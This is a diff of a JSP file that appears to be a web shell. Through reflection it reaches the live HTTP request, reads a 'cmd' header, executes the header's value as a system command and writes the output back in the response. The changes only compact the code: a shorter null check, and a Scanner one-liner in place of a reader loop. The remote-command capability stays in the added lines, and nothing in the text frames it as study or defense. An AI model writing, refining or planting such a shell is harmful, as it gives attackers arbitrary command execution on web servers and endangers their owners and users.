@@ -11,9 +11,7 @@
 
     Object[] obj_arr = (Object[]) obj;
     for(Object o : obj_arr){
-        if(o == null){
-            continue;
-        }
+        if(o == null) continue;
 
         field = o.getClass().getDeclaredField("value");
         field.setAccessible(true);
@@ -28,22 +26,14 @@
             method = obj.getClass().getMethod("getHeader", String.class);
             obj = method.invoke(obj, "cmd");
 
-            java.io.InputStream in = Runtime.getRuntime().exec(obj.toString()).getInputStream();
-            java.io.InputStreamReader isr = new java.io.InputStreamReader(in);
-            java.io.BufferedReader br = new java.io.BufferedReader(isr);
-
-            StringBuilder sb = new StringBuilder();
-            String line;
-            while((line =br.readLine()) != null){
-                sb.append(line + "\n");
-            }
+            String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter("\\A").next();
 
             method = httpChannel.getClass().getMethod("getResponse");
             obj = method.invoke(httpChannel);
 
             method = obj.getClass().getMethod("getWriter");
             java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj);
-            printWriter.println(sb.toString());
+            printWriter.println(res);
         }
     }
 %>
